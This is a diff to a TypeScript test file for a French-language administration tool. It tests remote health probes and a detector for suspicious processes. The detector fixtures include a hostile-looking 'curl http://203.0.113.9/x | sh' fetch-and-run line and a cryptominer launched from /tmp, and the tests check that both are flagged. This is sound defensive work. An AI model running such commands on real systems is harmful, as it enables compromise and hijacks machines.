@@ -18,6 +18,8 @@ import { cheminMontre, commandeUnix, grosUtile, GROS_UTILES, lireOu, lirePoste, 
 import { erreurSmb, ligneLs, lireFichiersSmb, lirePartages, listerSmb, panneConnexion, partagesSmb, tourneEnRond } from '../src/machines/smb.ts';
 import { allModules } from '../src/valhalla/odin.ts';
 import { estIci, ligneDeCommande, posteDe, postesLisibles } from '../src/valhalla/postes.ts';
+import { lireSonde } from '../src/valhalla/modules/eir.ts';
+import { judge, lireSondeProcs } from '../src/valhalla/modules/skogul.ts';
 import { Valhalla } from '../src/valhalla/service.ts';
 import { DEFAULT_CONFIG } from '../src/config.ts';
 
@@ -351,7 +353,7 @@ test('disques, pare-feu et journaux d\'un autre poste, lus par un vrai SSH : mê
     assert.deepEqual((distant.data as { volumes: unknown[] }).volumes, (local.data as { volumes: unknown[] }).volumes); assert.equal((distant.data as { poste: string }).poste, 'serveur-web');
     assert.match((await w.v.act('fensalir', 'partages', { poste: 'serveur-web' })).text, /^Sur serveur-web :\n/);
     const page = await w.v.modules().find((m) => m.id === 'fensalir')!.view(ctx, new URLSearchParams({ poste: 'serveur-web' }));
-    assert.match(page.subtitle ?? '', /^serveur-web · /); assert.ok(page.side?.some((x) => x.kind === 'table' && x.title === 'Voir un autre poste'));
+    assert.match(page.subtitle ?? '', /^serveur-web · /); assert.ok(page.side?.some((x) => x.kind === 'form' && x.title === 'Voir les disques d\'un autre poste' && x.action === 'disques'), 'la page propose de voir un autre poste (le résultat reste affiché sous le formulaire)');
     // Thermopyles : les ports à l'écoute du poste, dont le SSH d'essai.
     const fw = await w.v.act('hlid', 'etat', { poste: 'serveur-web' }); assert.equal(fw.ok, true, fw.text); assert.match(fw.text, /^Sur serveur-web · Pare-feu : /);
     assert.ok((fw.data as { ecoutes: Array<{ port: number }> }).ecoutes.some((e) => e.port === b.sshPort), 'le port du SSH d\'essai est vu à l\'écoute sur le poste');
@@ -361,9 +363,78 @@ test('disques, pare-feu et journaux d\'un autre poste, lus par un vrai SSH : mê
     assert.match((await w.v.act('mimisbrunnr', 'chercher', { q: 'ALERTE-LOCALE-ZZ7', heures: 1 })).text, /ALERTE-LOCALE-ZZ7/);
     const jr = await w.v.act('mimisbrunnr', 'chercher', { q: 'ALERTE-LOCALE-ZZ7', heures: 1, poste: 'serveur-web' }); assert.equal(jr.ok, true, jr.text); assert.doesNotMatch(jr.text, /ALERTE-LOCALE-ZZ7/);
     assert.equal((await w.v.act('mimisbrunnr', 'repetes', { poste: 'serveur-web' })).ok, true);
+    // Sans IA : « … sur serveur-web » est compris tout seul (le poste est un nom connu de la page).
+    const dit = await w.v.order('état des disques sur serveur-web');
+    const compris = dit.understood as { kind: string; module?: string; action?: string; input?: Record<string, unknown> } | undefined;
+    assert.deepEqual([compris?.kind, `${compris?.module}.${compris?.action}`, compris?.input], ['action', 'fensalir.disques', { poste: 'serveur-web' }]);
+    assert.match(dit.text, /Sur serveur-web :\n/);
     // Refus clairs : poste inconnu, poste éteint.
     const inconnu = await w.v.act('fensalir', 'disques', { poste: 'nas-du-garage' }); assert.equal(inconnu.ok, false); assert.match(inconnu.text, /poste « nas-du-garage » inconnu/);
     saveMachine(w.home, { label: 'eteint', host: '127.0.0.1', user: 'root', port: await libre(), via: 'ssh' });
     const eteint = await w.v.act('hlid', 'etat', { poste: 'eteint' }); assert.equal(eteint.ok, false); assert.match(eteint.text, /SSH est fermé sur eteint/);
   } finally { w.fin(); b.fin(); }
+});
+
+test('Hygie : l\'état d\'un autre poste (Linux et Mac), lu d\'une seule demande', () => {
+  const linux = lireSonde('serveur-web', `---SYS\nLinux\nsrv-web-01\n6.8.0-45-generic\n---STAT\ncpu  1000 0 500 8000 100 0 0 0 0 0\ncpu  1100 0 550 8300 150 0 0 0 0 0\n---MEM\nMemTotal:        8000000 kB\nMemFree:          500000 kB\nMemAvailable:    2000000 kB\nBuffers:          100000 kB\nCached:          1500000 kB\nSwapTotal:       2000000 kB\nSwapFree:        1500000 kB\n---CHARGE\n0.52 0.40 0.31 1/312 4242\n---DUREE\n1036800.55 4000000.00\n---COEURS\n4\n---DISQUES\nFilesystem     1024-blocks      Used Available Capacity Mounted on\n/dev/sda1        100000000  61000000  39000000      61% /\ntmpfs              4000000         0   4000000       0% /dev/shm\n/dev/loop3           66846     66846         0     100% /snap/core22/1612\n/dev/sdb1       1000000000 950000000  50000000      95% /srv/data\n/dev/sda1        100000000  61000000  39000000      61% /home\n`);
+  assert.deepEqual({ systeme: linux.systeme, hote: linux.hote, noyau: linux.noyau, coeurs: linux.coeurs, allumeDepuis: linux.allumeDepuis, cpu: linux.cpu, attente: linux.attente, charge: linux.charge }, { systeme: 'Linux', hote: 'srv-web-01', noyau: '6.8.0-45-generic', coeurs: 4, allumeDepuis: 1036801, cpu: 30, attente: 10, charge: [0.52, 0.4, 0.31] });
+  assert.deepEqual(linux.mem, { total: 8000000 * 1024, utilisee: 6000000 * 1024, echange: 500000 * 1024 });
+  assert.deepEqual(linux.disques.map((d) => [d.mount, d.pct]), [['/', 61], ['/srv/data', 95]], 'volumes virtuels, snap et doublons retirés');
+  const mac = lireSonde('mac-de-fatima', `---SYS\nDarwin\nMac-de-Fatima.local\n24.1.0\n---STAT\n---MEM\n---CHARGE\n18:02  up 3 days,  4:11, 2 users, load averages: 1,52 1,80 2,01\n---DUREE\n---COEURS\n8\n---DISQUES\nFilesystem     1024-blocks      Used Available Capacity  Mounted on\n/dev/disk3s1s1   482797652  10876580 201430956     6%    /\ndevfs                  205       205         0   100%    /dev\n/dev/disk3s6     482797652   2097172 201430956     2%    /System/Volumes/VM\n/dev/disk3s5     482797652 266936788 201430956    57%    /System/Volumes/Data\nmap auto_home            0         0         0   100%    /System/Volumes/Data/home\n`);
+  assert.deepEqual({ systeme: mac.systeme, coeurs: mac.coeurs, cpu: mac.cpu, mem: mac.mem, charge: mac.charge }, { systeme: 'macOS', coeurs: 8, cpu: undefined, mem: undefined, charge: [1.52, 1.8, 2.01] });
+  assert.deepEqual(mac.disques.map((d) => [d.mount, d.pct]), [['/', 5], ['/System/Volumes/Data', 57]]);
+  assert.deepEqual(lireSonde('x', '').disques, []);
+});
+
+test('Hygie par un vrai SSH : état et processus d\'un autre poste', { skip: !peutSsh ? 'sshd absent' : false, timeout: 120_000 }, async () => {
+  const b = await banc(), w = monde(b);
+  try {
+    saveMachine(w.home, { label: 'serveur-web', host: '127.0.0.1', user: 'root', port: b.sshPort, via: 'ssh' });
+    const r = await w.v.act('eir', 'etat', { poste: 'serveur-web' }); assert.equal(r.ok, true, r.text);
+    assert.match(r.text, /^serveur-web \(.+\) · Linux .+\nProcesseur [\d.]+ % \((bon|à suivre|attention|grave)\) · \d+ cœurs · charge [\d.]+ \/ [\d.]+ \/ [\d.]+/); assert.match(r.text, /\nMémoire .+ \/ .+ \(\d+ %, /); assert.match(r.text, /\nDisque \/ : \d+ % /);
+    const e = r.data as { coeurs: number; mem: { total: number } }; assert.ok(e.coeurs >= 1 && e.mem.total > 100 * 1024 * 1024);
+    const ps = await w.v.act('eir', 'processus', { poste: 'serveur-web', n: 5 }); assert.equal(ps.ok, true, ps.text); assert.match(ps.text, /^Sur serveur-web :\n\d+ · /); assert.equal((ps.data as unknown[]).length, 5);
+    assert.match((await w.v.act('eir', 'etat')).text, /Processeur/, 'sans poste : la machine d\'Odin, comme avant');
+    assert.equal((await w.v.act('eir', 'etat', { poste: 'inconnu' })).ok, false);
+  } finally { w.fin(); b.fin(); }
+});
+
+test('Némésis : les programmes d\'un autre poste (Linux avec leur vrai chemin, Mac sans), lus d\'une seule demande', () => {
+  const linux = lireSondeProcs(['    1 /sbin/init splash', '  812 nginx: master process /usr/sbin/nginx -g daemon on;', '  901 sh -c curl http://203.0.113.9/x | sh', ' 4242 ./kdevtmpfsi --donate-level 1', ' 5000 /usr/bin/python3 /opt/mon appli/serveur.py',
+    '---PROG', '    1     0     0 systemd', '  812     1     0 nginx', '  901   812    33 sh', ' 4242     1  1000 kdevtmpfsi', ' 5000     1  1000 python3',
+    '---EXE', '1\t/usr/lib/systemd/systemd', '812\t/usr/sbin/nginx', '901\t/usr/bin/dash', '4242\t/tmp/.x/kdevtmpfsi (deleted)', '5000\t/usr/bin/python3.12', 'pas un numéro\t/x', ''].join('\n'));
+  assert.equal(linux.length, 5); assert.deepEqual(linux.find((p) => p.pid === 4242), { pid: 4242, ppid: 1, uid: 1000, name: 'kdevtmpfsi', exe: '/tmp/.x/kdevtmpfsi (deleted)', cmd: './kdevtmpfsi --donate-level 1' });
+  assert.equal(linux.find((p) => p.pid === 5000)!.cmd, '/usr/bin/python3 /opt/mon appli/serveur.py', 'un chemin avec des espaces reste entier');
+  assert.deepEqual(judge(linux).map((x) => `${x.pid} ${x.rule}`).sort(), ['4242 mineur de cryptomonnaie', '4242 programme effacé après son lancement', '4242 programme lancé depuis un dossier temporaire', '901 shell ouvert par le serveur web']);
+  // Un Mac n'a pas /proc : « ps » donne déjà le chemin complet du programme.
+  const mac = lireSondeProcs(['  1 /sbin/launchd', ' 77 /private/tmp/outil --cache', '---PROG', '  1   0   0 /sbin/launchd', ' 77   1 501 /private/tmp/outil', '---EXE', ''].join('\n'));
+  assert.deepEqual(mac.map((p) => [p.pid, p.name, p.exe]), [[1, 'launchd', '/sbin/launchd'], [77, 'outil', '/private/tmp/outil']]);
+  assert.deepEqual(lireSondeProcs(''), []); assert.deepEqual(lireSondeProcs('n\'importe quoi\n'), []);
+});
+
+test('Némésis par un vrai SSH : un programme lancé depuis un dossier temporaire est trouvé sur l\'autre poste, puis arrêté avec ton accord', { skip: !peutSsh ? 'sshd absent' : false, timeout: 120_000 }, async () => {
+  const b = await banc(), w = monde(b), dir = mkdtempSync('/tmp/odin-essai-');
+  let enfant: ChildProcess | undefined;
+  try {
+    saveMachine(w.home, { label: 'serveur-web', host: '127.0.0.1', user: 'root', port: b.sshPort, via: 'ssh' });
+    // Inoffensif : une copie de « sleep », lancée depuis /tmp comme le ferait un programme déposé par un intrus.
+    copyFileSync('/bin/sleep', join(dir, 'dormeur')); chmodSync(join(dir, 'dormeur'), 0o755);
+    enfant = spawn(join(dir, 'dormeur'), ['300'], { stdio: 'ignore' }); await new Promise((r) => setTimeout(r, 300));
+    const r = await w.v.act('skogul', 'analyser', { poste: 'serveur-web' }); assert.equal(r.ok, true, r.text);
+    assert.match(r.text, /^serveur-web · \d+ programme\(s\) en cours\n/); assert.match(r.text, new RegExp(`\\[haute\\] programme lancé depuis un dossier temporaire — dormeur \\(pid ${enfant.pid}\\)`), r.text);
+    assert.doesNotMatch(r.text, /---PROG/, 'la demande d\'Odin elle-même n\'est pas signalée');
+    const d = r.data as { programmes: number; complet: boolean; decouvertes: Array<{ pid: number }> }; assert.ok(d.programmes > 3 && d.complet && d.decouvertes.some((x) => x.pid === enfant!.pid));
+    // Arrêter là-bas : action grave (ton accord), puis le programme n'existe plus.
+    const tuer = w.v.module('skogul')!.actions.find((x) => x.id === 'tuer')!;
+    assert.equal(tuer.grave!({ pid: enfant.pid, poste: 'serveur-web' }), `arrêter le processus ${enfant.pid} sur serveur-web`); assert.equal(tuer.grave!({ pid: 4242 }), 'arrêter le processus 4242');
+    const fini = new Promise<void>((ok) => enfant!.once('exit', () => ok()));
+    const k = await w.v.act('skogul', 'tuer', { pid: enfant.pid, poste: 'serveur-web' }); assert.match(k.text, new RegExp(`Processus ${enfant.pid} arrêté sur serveur-web`), k.text);
+    await fini; assert.equal(enfant.signalCode, 'SIGKILL');
+    assert.doesNotMatch((await w.v.act('skogul', 'analyser', { poste: 'serveur-web' })).text, /dormeur/);
+    assert.equal((await w.v.act('skogul', 'analyser', { poste: 'inconnu' })).ok, false);
+    assert.match((await w.v.act('skogul', 'analyser')).text, /Aucun comportement suspect|\[(critique|haute|moyenne)\]/, 'sans poste : la machine d\'Odin, comme avant');
+    assert.match((await w.v.order('processus suspects sur serveur-web')).text, /^Némésis · Analyser maintenant\nserveur-web · \d+ programme/, 'sans IA aussi');
+    const vue = await w.v.module('skogul')!.view(w.v.ctx('skogul'), new URLSearchParams());
+    assert.ok(vue.side?.some((x) => x.kind === 'form' && x.title === 'Analyser un autre poste' && x.params[0].options?.includes('serveur-web')));
+  } finally { try { enfant?.kill('SIGKILL'); } catch { /* déjà arrêté */ } rmSync(dir, { recursive: true, force: true }); w.fin(); b.fin(); }
 });
